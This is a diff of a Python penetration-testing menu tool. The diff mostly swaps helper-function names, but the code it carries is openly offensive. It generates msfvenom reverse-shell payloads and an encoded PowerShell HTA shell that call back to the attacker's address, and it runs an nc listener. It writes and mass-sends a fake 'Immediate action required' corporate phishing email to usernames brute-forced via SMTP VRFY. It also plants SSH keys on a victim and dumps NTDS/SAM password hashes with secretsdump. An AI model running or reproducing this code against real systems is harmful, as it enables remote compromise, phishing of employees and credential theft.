+         runCommand("msfvenom -p windows/meterpreter/reverse_tcp            LHOST=" + localIP + "         LPORT=" + checkParams + " -f aspx   -o " + explDir + "/windows_meterpreter_reverse_tcp.aspx >> arsenal.tmp 2>&1")
+         runCommand("msfvenom -p java/jsp_shell_reverse_tcp                 LHOST=" + localIP + "         LPORT=" + checkParams + " -f war    -o " + explDir + "/java_jsp_shell_reverse_tcp.war >> arsenal.tmp 2>&1")
+         runCommand("msfvenom -p cmd/unix/reverse_bash                      LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + explDir + "/cmd_unix_reverse_bash.sh >> arsenal.tmp 2>&1")
+         runCommand("msfvenom -p cmd/unix/reverse_python                    LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + explDir + "/cmd_unix_reverse_python.py >> arsenal.tmp 2>&1")
+         runCommand("msfvenom -p cmd/unix/reverse_perl                      LHOST=" + localIP + "         LPORT=" + checkParams + " -f raw    -o " + explDir + "/cmd_unix_reverse_perl.pl >> arsenal.tmp 2>&1")
+         runCommand("chmod +X *.*")
       prompt()
             
 # ------------------------------------------------------------------------------------- 
@@ -3149,11 +3107,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='66':
-      print(colored("[*] Scanning for directories, please wait this will take a long time...", colour3))   
-#      localCOM("mkdir dictionary")
-#      os.chdir("dictionary")
-#      localCOM("cp /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt ./dict1.tmp")
-#      localCOM("split dict1.tmp -n 26")      
+      print(colored("[*] Scanning for directories and files, please wait this will take a long time...", colour3))   
       checkParams = test_WEB()
       if checkParams != 1:
          print("[+] Using URL address...")
@@ -3161,87 +3115,7 @@ while True:
       else:
          print("[+] Using IP address...")
          target = TIP.rstrip(" ")
-      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50 -o dir.tmp")
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -w xab -t 50 >> dir.tmp")
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -w xac -t 50 >> dir.tmp")        
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -w xad -t 50 >> dir.tmp")                 
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -w xae -t 50 >> dir.tmp")                 
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -w xaf -t 50 >> dir.tmp")                      
-#      print("[i] 25% Complete...")
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -w xag -t 50 >> dir.tmp")                            
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -w xah -t 50 >> dir.tmp")                            
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -w xai -t 50 >> dir.tmp")                                        
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -w xaj -t 50 >> dir.tmp")                                              
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -w xak -t 50 >> dir.tmp")                                                          
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -w xal -t 50 >> dir.tmp")                                                               
-#      print("[i] 50% Complete...")
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -w xam -t 50 >> dir.tmp")                                                                           
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -w xan -t 50 >> dir.tmp")                                                                                 
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -w xao -t 50 >> dir.tmp")                                                                                       
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -w xap -t 50 >> dir.tmp")                                                                                             
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -w xaq -t 50 >> dir.tmp")                                                                                                   
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -w xar -t 50 >> dir.tmp")                                                                                                         
-#      print("[i] 75% Complete...")                     
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -w xas -t 50 >> dir.tmp")                                                                                                                     
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -w xat -t 50 >> dir.tmp")                                                                                                               
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -w xau -t 50 >> dir.tmp")                                                                                                               
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -w xav -t 50 >> dir.tmp")                                                                                                                    
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -w xaw -t 50 >> dir.tmp") 
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -w xax -t 50 >> dir.tmp")     
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -w xay -t 50 >> dir.tmp") 
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -w xaz -t 50 >> dir.tmp") 
-#      print("[-] 100% complete - exhausted!!...")
-      localCOM("grep -Eo '^[^ ]+' dir.tmp > list.tmp")
-      localCOM("tr -d '/' < list.tmp > dir2.tmp")
-      localCOM("sed -i '/\./d' dir2.tmp")
-      parsFile("dir2.tmp")    
-#      catsFile("dir2.tmp")  
-
-      print("[+] Sorting valid responces...")
-      localCOM("cat dir2.tmp | grep 200 > 200ok.tmp")
-      catsFile("200ok.tmp")
-
-
-   
-      localCOM("cat /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt > dict2.tmp")
-      localCOM("cat 200ok.tmp >> dict2.tmp")      
-      print(colored("[+] Enumerating files, please wait this can take sometime...", colour3))
-      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -x " + fileExt + " -w dict2.tmp -t 50 -o dir3.tmp")     
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -x " + fileExt + " -w xab -t 50 > dir3.tmp")     
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -x " + fileExt + " -w xac -t 50 > dir3.tmp")     
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -x " + fileExt + " -w xad -t 50 > dir3.tmp")     
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -x " + fileExt + " -w xae -t 50 > dir3.tmp")     
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -x " + fileExt + " -w xaf -t 50 > dir3.tmp")  
-#      print("[i] 25% Complete...")
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -x " + fileExt + " -w xag -t 50 > dir3.tmp")     
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -x " + fileExt + " -w xah -t 50 > dir3.tmp")     
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -x " + fileExt + " -w xai -t 50 > dir3.tmp")     
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -x " + fileExt + " -w xaj -t 50 > dir3.tmp")     
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -x " + fileExt + " -w xak -t 50 > dir3.tmp")     
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -x " + fileExt + " -w xal -t 50 > dir3.tmp")     
-#      print("[i] 50% Complete...")     
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -x " + fileExt + " -w xam -t 50 > dir3.tmp")     
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -x " + fileExt + " -w xan -t 50 > dir3.tmp")     
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -x " + fileExt + " -w xao -t 50 > dir3.tmp")           
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -x " + fileExt + " -w xap -t 50 > dir3.tmp")     
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -x " + fileExt + " -w xaq -t 50 > dir3.tmp")     
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -x " + fileExt + " -w xar -t 50 > dir3.tmp")     
-#      print("[i] 75% Complete...")      
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -x " + fileExt + " -w xas -t 50 > dir3.tmp")     
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -x " + fileExt + " -w xat -t 50 > dir3.tmp")     
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -x " + fileExt + " -w xau -t 50 > dir3.tmp")     
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -x " + fileExt + " -w xav -t 50 > dir3.tmp")     
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -x " + fileExt + " -w xaw -t 50 > dir3.tmp")     
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -x " + fileExt + " -w xax -t 50 > dir3.tmp")     
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -x " + fileExt + " -w xay -t 50 > dir3.tmp")                                                     
-#      remotCOM("gobuster dir -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -x " + fileExt + " -w xaz -t 50 > dir3.tmp")           
-#      print("[-] 100% complete - exhausted!!...")      
-#      localCOM("sed -i '/\./d' dir3.tmp")
-#      catsFile("dir3.tmp")
-
-#      localCOM("rm *")
-#      localCOM("cd ..")
-#      localCOM("rmdir dictionary")
+      runCommand("gobuster dir -e -q -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + target + " -x " + fileExt + " -w  /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt --wildcard -t 100 -o dir.tmp")
       prompt()
       
 # ------------------------------------------------------------------------------------- 
@@ -3256,37 +3130,37 @@ while True:
       checkParams = test_PRT("161")      
       if checkParams != 1:
          print(colored("[*] Checking all communities...", colour3))
-         localCOM("echo 'public' > community.tmp")
-         localCOM("echo 'private' >> community.tmp")
-         localCOM("echo 'manager' >> community.tmp")
-         remotCOM("onesixtyone -c community.tmp " + TIP.rstrip(" ") + " > 161.tmp") 
+         runCommand("echo 'public' > community.tmp")
+         runCommand("echo 'private' >> community.tmp")
+         runCommand("echo 'manager' >> community.tmp")
+         runCommand("onesixtyone -c community.tmp " + TIP.rstrip(" ") + " > 161.tmp") 
          catsFile("161.tmp")      
          print(colored("[*] Enumerating public v2c communities only...", colour3))      
          print("[+] Checking system processes...")
-         remotCOM("snmpwalk -v2c -c public " + TIP.rstrip(" ") + " 1.3.6.1.2.1.25.1.6.0 > walk.tmp")
+         runCommand("snmpwalk -v2c -c public " + TIP.rstrip(" ") + " 1.3.6.1.2.1.25.1.6.0 > walk.tmp")
          catsFile("walk.tmp")      
          print("[+] Checking running processes...")
-         remotCOM("snmpwalk -v2c -c public " + TIP.rstrip(" ") + " 1.3.6.1.2.1.25.4.2.1.2 > walk.tmp")
+         runCommand("snmpwalk -v2c -c public " + TIP.rstrip(" ") + " 1.3.6.1.2.1.25.4.2.1.2 > walk.tmp")
          catsFile("walk.tmp")      
          print("[+] Checking running systems...")
-         remotCOM("snmpwalk -v2c -c public " + TIP.rstrip(" ") + " 1.3.6.1.2.1.25.4.2.1.4 > walk.tmp")
+         runCommand("snmpwalk -v2c -c public " + TIP.rstrip(" ") + " 1.3.6.1.2.1.25.4.2.1.4 > walk.tmp")
          catsFile("walk.tmp")      
          print("[+] Checking storage units...")
-         remotCOM("snmpwalk -v2c -c public " + TIP.rstrip(" ") + " 1.3.6.1.2.1.25.2.3.1.4 > walk.tmp")
+         runCommand("snmpwalk -v2c -c public " + TIP.rstrip(" ") + " 1.3.6.1.2.1.25.2.3.1.4 > walk.tmp")
          catsFile("walk.tmp")      
          print("[+] Checking software names...")
-         remotCOM("snmpwalk -v2c -c public " + TIP.rstrip(" ") + " 1.3.6.1.2.1.25.6.3.1.2 > walk.tmp")
+         runCommand("snmpwalk -v2c -c public " + TIP.rstrip(" ") + " 1.3.6.1.2.1.25.6.3.1.2 > walk.tmp")
          catsFile("walk.tmp")      
          print("[+] Checking user accounts...")
-         remotCOM("snmpwalk -v2c -c public " + TIP.rstrip(" ") + " 1.3.6.1.4.1.77.1.2.25 > walk.tmp")
+         runCommand("snmpwalk -v2c -c public " + TIP.rstrip(" ") + " 1.3.6.1.4.1.77.1.2.25 > walk.tmp")
          catsFile("walk.tmp")      
          print("[+] Checking local ports...")
-         remotCOM("snmpwalk -v2c -c public " + TIP.rstrip(" ") + " 1.3.6.1.2.1.6.13.1.3 > walk.tmp")
+         runCommand("snmpwalk -v2c -c public " + TIP.rstrip(" ") + " 1.3.6.1.2.1.6.13.1.3 > walk.tmp")
          catsFile("walk.tmp")
          print("[+] Checking for printer passwords...")
-         remotCOM("snmpwalk -v 2c -c public " + TIP.rstrip(" ") + " .1.3.6.1.4.1.11.2.3.9.1.1.13.0 > printer.tmp")
+         runCommand("snmpwalk -v 2c -c public " + TIP.rstrip(" ") + " .1.3.6.1.4.1.11.2.3.9.1.1.13.0 > printer.tmp")
          catsFile("printer.tmp")              
-         localCOM("cat printer.tmp | tr -d '\n\r' > printer2.tmp")
+         runCommand("cat printer.tmp | tr -d '\n\r' > printer2.tmp")
          found = linecache.getline("printer2.tmp", 1).rstrip("\n")
          if found != "":
             data1,data2 = found.split("BITS:")
@@ -3297,10 +3171,10 @@ while True:
             printerpassword = data3
             print(colored(printerpassword + "\n", colour0))         
          print(colored("[*] Enumerating the entire MIB tree, please wait this may take sometime...", colour3))
-         remotCOM("snmpwalk -v2c -c public " + TIP.rstrip(" ") + " > walk.tmp")    
+         runCommand("snmpwalk -v2c -c public " + TIP.rstrip(" ") + " > walk.tmp")    
          print("[+] Searching for any interesting finds...")
-         localCOM("grep password walk.tmp > find.tmp")
-         localCOM("grep user walk.tmp >> find.tmp")
+         runCommand("grep password walk.tmp > find.tmp")
+         runCommand("grep user walk.tmp >> find.tmp")
          finds = linecache.getline("find.txt", 1)
          if finds[:1] == "":
             print("[-] No usernames or passwords were found...")
@@ -3325,12 +3199,12 @@ while True:
          checkParams = 1               
       if checkParams != 1:    
          print(colored("[*] Starting phishing server...", colour3))               
-         localCOM("xdotool key Ctrl+Shift+T")
-         localCOM("xdotool key Alt+Shift+S; xdotool type 'GONE PHISHING'; xdotool key Return")
+         runCommand("xdotool key Ctrl+Shift+T")
+         runCommand("xdotool key Alt+Shift+S; xdotool type 'GONE PHISHING'; xdotool key Return")
          dispBanner("GONE PHISHING",0)
-         localCOM("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
-         localCOM("xdotool type 'rlwrap nc -nvlp " + checkParams + "'; xdotool key Return")
-         localCOM("xdotool key Ctrl+Tab")            
+         runCommand("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
+         runCommand("xdotool type 'rlwrap nc -nvlp " + checkParams + "'; xdotool key Return")
+         runCommand("xdotool key Ctrl+Tab")            
          payLoad = f"""      
          a=new ActiveXObject("WScript.Shell");
          a.run("powershell -nop -w 1 -enc {powershell(localIP, checkParams)}", 0);window.close();
@@ -3407,7 +3281,7 @@ while True:
                print(colored(helpResponce, colour6))            
                print(colored("\n[*] Attempting to bruteforce valid usernames...", colour3))
                count = lineCount(dataDir + "/usernames.txt")
-               localCOM("touch valid.tmp")
+               runCommand("touch valid.tmp")
                for x in range(0, count):
                   data = linecache.getline(dataDir + "/usernames.txt", x + 1)
                   string = "VRFY " + data.rstrip("\n") + "\r\n"
@@ -3417,7 +3291,7 @@ while True:
                   except:
                      print(colored("[!] WARNING!!! - Huston, we encountered a connection issue... just letting you know!!...", colour0))
                   if "550" not in str(bruteCheck):
-                     localCOM("echo " + data.rstrip("\n") + " >> valid.tmp")
+                     runCommand("echo " + data.rstrip("\n") + " >> valid.tmp")
                nullTest = linecache.getline("valid.tmp",1)
                if nullTest != "":
                   print("[+] Valid usernames found...")
@@ -3437,19 +3311,19 @@ while True:
                s.close()            
                if check != 1:
                   print(colored("\n[*] Creating a corporate looking phishing email...", colour3))
-                  localCOM('echo "Subject: Immediate action required\n" > body.tmp')
-                  localCOM('echo "Hello.\n" >> body.tmp')
-                  localCOM('echo "We just performed maintenance on our servers." >> body.tmp') 
-                  localCOM('echo "Please verify if you can still access the login page:\n" >> body.tmp')
-                  localCOM('echo "\t  <img src=\""' + localIP + ":" + checkParams + '"/img\">" >> body.tmp')
-                  localCOM('echo "\t  Citrix http://"' + localIP + ":" + checkParams + '"/" >> body.tmp')
-                  localCOM('echo "  <a href=\"http://"' + localIP + ":" + checkParams + '"\">click me.</a>" >> body.tmp')
-                  localCOM('echo "\nRegards," >> body.tmp')
+                  runCommand('echo "Subject: Immediate action required\n" > body.tmp')
+                  runCommand('echo "Hello.\n" >> body.tmp')
+                  runCommand('echo "We just performed maintenance on our servers." >> body.tmp') 
+                  runCommand('echo "Please verify if you can still access the login page:\n" >> body.tmp')
+                  runCommand('echo "\t  <img src=\""' + localIP + ":" + checkParams + '"/img\">" >> body.tmp')
+                  runCommand('echo "\t  Citrix http://"' + localIP + ":" + checkParams + '"/" >> body.tmp')
+                  runCommand('echo "  <a href=\"http://"' + localIP + ":" + checkParams + '"\">click me.</a>" >> body.tmp')
+                  runCommand('echo "\nRegards," >> body.tmp')
                   if USR[:1] == "'":
-                     localCOM('echo it@' + DOM.rstrip(" ") + ' >> body.tmp')
+                     runCommand('echo it@' + DOM.rstrip(" ") + ' >> body.tmp')
                      sender = "it"
                   else:
-                     localCOM('echo ' + USR.rstrip(" ") + '@' + localIP + ' >> body.tmp')
+                     runCommand('echo ' + USR.rstrip(" ") + '@' + localIP + ' >> body.tmp')
                      sender = USR.rstrip(" ")
                   catsFile("body.tmp")
                   print(colored("[*] Phishing the valid username list...", colour3))
@@ -3461,7 +3335,7 @@ while True:
                         phish = phish + "@"
                         phish = phish + DOM.rstrip(" ")
                         try:
-                           remotCOM("swaks --to " + phish + " --from " + sender + "@" + DOM.rstrip(" ") + " --header 'Subject: Immediate action required' --server " + TIP.rstrip(" ") + " --port 25 --body @body.tmp > log.tmp")
+                           runCommand("swaks --to " + phish + " --from " + sender + "@" + DOM.rstrip(" ") + " --header 'Subject: Immediate action required' --server " + TIP.rstrip(" ") + " --port 25 --body @body.tmp > log.tmp")
                            print("[+] Email exploit sent to " + phish + " from " + sender + "@" + DOM.rstrip(" ") + "...")
                         except:
                            print(colored("[!] WARNING!!! - Huston, we encountered a connection issue... just letting you know!!...", colour0))
@@ -3492,9 +3366,9 @@ while True:
                   file = file.replace(" ","_")
                   file = file.rstrip("\n")
                   ffile = "file" + file
-                  remotCOM("wget -q -O " + ffile + " " + WEB + line)
+                  runCommand("wget -q -O " + ffile + " " + WEB + line)
                   if os.stat(ffile).st_size == 0:
-                     localCOM("rm " + ffile)
+                     runCommand("rm " + ffile)
                print("[+] Completed...")
             else:
                file1 = open("../TREADSTONE/windowslfi.txt", 'r')
@@ -3505,11 +3379,11 @@ while True:
                   file = file.replace(" ","_")
                   file = file.rstrip("\n")
                   ffile = "file" + file
-                  remotCOM("wget -q -O " + ffile + " " + WEB + line)
+                  runCommand("wget -q -O " + ffile + " " + WEB + line)
                   if os.stat(ffile).st_size == 0:
-                     localCOM("rm " + ffile)
+                     runCommand("rm " + ffile)
                print("[+] Completed...")
-            localCOM("cd ..")
+            runCommand("cd ..")
          else:
             print("[-] Unknown operating system...")          
       prompt()   
@@ -3527,33 +3401,33 @@ while True:
       checkParams = 0
       subChoice = input("[?] Please select the file you wish to edit: ")      
       if subChoice == "1":
-         localCOM("nano " + dataDir + "/usernames.txt")               
+         runCommand("nano " + dataDir + "/usernames.txt")               
          for x in range (0, maxUser):
             USER[x] = linecache.getline(dataDir + "/usernames.txt", x + 1).rstrip(" ")
             USER[x] = spacePadding(USER[x], COL3)         
          wipeTokens(VALD)
          checkParams = 1         
       if subChoice == "2":
-         localCOM("nano " + dataDir + "/passwords.txt")
+         runCommand("nano " + dataDir + "/passwords.txt")
          checkParams = 1         
       if subChoice == "3":
-         localCOM("nano " + dataDir + "/hashes.txt")                    
+         runCommand("nano " + dataDir + "/hashes.txt")                    
          for x in range (0, maxUser):
                HASH[x] = linecache.getline(dataDir + "/hashes.txt", x + 1).rstrip(" ")
                HASH[x] = spacePadding(HASH[x], COL4)            
          wipeTokens(VALD)
          checkParams = 1         
       if subChoice == "4":
-         localCOM("nano /etc/hosts")
+         runCommand("nano /etc/hosts")
          checkParams = 1         
       if subChoice == "5":
-         localCOM("nano /etc/resolv.conf")
+         runCommand("nano /etc/resolv.conf")
          checkParams = 1         
       if subChoice == "6":
-         localCOM("nano /etc/proxychains.conf")
+         runCommand("nano /etc/proxychains.conf")
          checkParams = 1         
       if subChoice == "7":
-         localCOM("nano /etc/krb5.conf")
+         runCommand("nano /etc/krb5.conf")
          checkParams = 1
       if subChoice == "8":
          pass
@@ -3587,10 +3461,10 @@ while True:
    if selection =='73':
       print(colored("[*] Generating Keys...", colour3))
       if os.path.exists("id_rsa.pub"):
-         localCOM("rm id_rsa")
-         localCOM("rm id_rsa.pub")
-      localCOM("ssh-keygen -t rsa -b 4096 -N '' -f './id_rsa' >/dev/null 2>&1")
-      localCOM("chmod 600 id_rsa")
+         runCommand("rm id_rsa")
+         runCommand("rm id_rsa.pub")
+      runCommand("ssh-keygen -t rsa -b 4096 -N '' -f './id_rsa' >/dev/null 2>&1")
+      runCommand("chmod 600 id_rsa")
       catsFile("id_rsa.pub")
       print("[+] Now insert the above into authorized_Keys on the victim's machine...")            
       if USR[:2] == "''":
@@ -3613,15 +3487,15 @@ while True:
          checkParams = test_WEB()
          if checkParams != 1:
             if WEB[:5] != "EMPTY":
-               remotCOM("cewl --depth 5 --min_word_length 3 --email --with-numbers --write " + dataDir + "/usernames.txt " + WEB.rstrip(" ") + " 2>&1")
+               runCommand("cewl --depth 5 --min_word_length 3 --email --with-numbers --write " + dataDir + "/usernames.txt " + WEB.rstrip(" ") + " 2>&1")
                print("[+] Username list generated via website...")
             else:
                checkParams = test_TIP()
                if checkParams != 1:
-                  remotCOM("cewl --depth 5 --min_word_length 3 --email --with-numbers --write " + dataDir + "/usernames.txt " + TIP.rstrip(" ") + " 2>&1")
+                  runCommand("cewl --depth 5 --min_word_length 3 --email --with-numbers --write " + dataDir + "/usernames.txt " + TIP.rstrip(" ") + " 2>&1")
                   print("[+] Username list generated via ip address...")
       else:
-         localCOM("cat /usr/share/ncrack/minimal.usr >> " + dataDir + "/usernames.txt 2>&1")
+         runCommand("cat /usr/share/ncrack/minimal.usr >> " + dataDir + "/usernames.txt 2>&1")
          cutLine("# minimal list of very", dataDir + "/usernames.txt")
          print("[+] Username list generated via /usr/share/ncrack/minimal.usr...")
 
@@ -3645,15 +3519,15 @@ while True:
          checkParams = test_WEB()
          if checkParams != 1:
             if WEB[:5] != "EMPTY":
-               remotCOM("cewl --depth 5 --min_word_length 3 --email --with-numbers --write " + dataDir + "/passwords.txt" + WEB.rstrip(" ") + " 2>&1")
+               runCommand("cewl --depth 5 --min_word_length 3 --email --with-numbers --write " + dataDir + "/passwords.txt" + WEB.rstrip(" ") + " 2>&1")
                print("[+] Password list generated via website...")
             else:
                checkParams = test_TIP()
                if checkParams != 1:
-                  remotCOM("cewl --depth 5 --min_word_length 3 --email --with-numbers --write " + dataDir + "/passwords.txt" + TIP.rstrip(" ") + " 2>&1")
+                  runCommand("cewl --depth 5 --min_word_length 3 --email --with-numbers --write " + dataDir + "/passwords.txt" + TIP.rstrip(" ") + " 2>&1")
                   print("[+] Password list generated via ip address...")
       else:
-         localCOM("cat /usr/share/ncrack/minimal.usr >> " + dataDir + "/passwords.txt 2>&1")
+         runCommand("cat /usr/share/ncrack/minimal.usr >> " + dataDir + "/passwords.txt 2>&1")
          cutLine("# minimal list of very", dataDir + "/passwords.txt")
          print("[+] Password list generated via /usr/share/ncrack/minimal.usr...")
       prompt()
@@ -3690,21 +3564,21 @@ while True:
          print(colored("[*] Extracting stored secrets, please wait...", colour3))         
          if os.path.exists("./" + workDir + "/ntds.dit"):
             print("[+] Found ntds.dit...")
-            remotCOM(keyPath + "secretsdump.py -ntds ./" + workDir + "/ntds.dit -system ./" + workDir +  "/SYSTEM -security ./" + workDir + "/SECURITY -hashes lmhash:nthash -pwd-last-set -history -user-status LOCAL -outputfile ./" + workDir +  "/ntlm-extract > log.tmp")      
-            localCOM("cut -f1 -d':' ./" + workDir + "/ntlm-extract.ntds > " + dataDir + "/usernames.txt")
-            localCOM("cut -f4 -d':' ./" + workDir + "/ntlm-extract.ntds > " + dataDir + "/hashes.txt")
+            runCommand(keyPath + "secretsdump.py -ntds ./" + workDir + "/ntds.dit -system ./" + workDir +  "/SYSTEM -security ./" + workDir + "/SECURITY -hashes lmhash:nthash -pwd-last-set -history -user-status LOCAL -outputfile ./" + workDir +  "/ntlm-extract > log.tmp")      
+            runCommand("cut -f1 -d':' ./" + workDir + "/ntlm-extract.ntds > " + dataDir + "/usernames.txt")
+            runCommand("cut -f4 -d':' ./" + workDir + "/ntlm-extract.ntds > " + dataDir + "/hashes.txt")
          else:
             if os.path.exists("./" + workDir + "/SECURITY"):
                print("[+] Found SAM, SYSTEM and SECURITY...")
-               localCOM(keyPath + "secretsdump.py -sam ./" + workDir + "/SAM -system ./" + workDir +  "/SYSTEM -security ./" + workDir + "/SECURITY -hashes lmhash:nthash -pwd-last-set -history -user-status LOCAL -outputfile ./" + workDir +  "/sam-extract > log.tmp")      
-               localCOM("cut -f1 -d':' ./" + workDir + "/sam-extract.sam > " + dataDir + "/usernames.txt")
-               localCOM("cut -f4 -d':' ./" + workDir + "/sam-extract.sam > " + dataDir + "/hashes.txt")  
+               runCommand(keyPath + "secretsdump.py -sam ./" + workDir + "/SAM -system ./" + workDir +  "/SYSTEM -security ./" + workDir + "/SECURITY -hashes lmhash:nthash -pwd-last-set -history -user-status LOCAL -outputfile ./" + workDir +  "/sam-extract > log.tmp")      
+               runCommand("cut -f1 -d':' ./" + workDir + "/sam-extract.sam > " + dataDir + "/usernames.txt")
+               runCommand("cut -f4 -d':' ./" + workDir + "/sam-extract.sam > " + dataDir + "/hashes.txt")  
             else:
                print("[+] Found SAM and SYSTEM...")
-               localCOM("samdump2 ./" + workDir + "/SYSTEM ./" + workDir + "/SAM > ./" + workDir + "/sam-extract.sam")
-               localCOM("sed -i 's/\*disabled\* *//g' ./" + workDir + "/sam-extract.sam")
-               localCOM("cut -f1 -d':' ./" + workDir + "*/sam-extract.sam > " + dataDir + "/usernames.txt")
-               localCOM("cut -f4 -d':' ./" + workDir + "/sam-extract.sam > " + dataDir + "/hashes.txt")  
+               runCommand("samdump2 ./" + workDir + "/SYSTEM ./" + workDir + "/SAM > ./" + workDir + "/sam-extract.sam")
+               runCommand("sed -i 's/\*disabled\* *//g' ./" + workDir + "/sam-extract.sam")
+               runCommand("cut -f1 -d':' ./" + workDir + "*/sam-extract.sam > " + dataDir + "/usernames.txt")
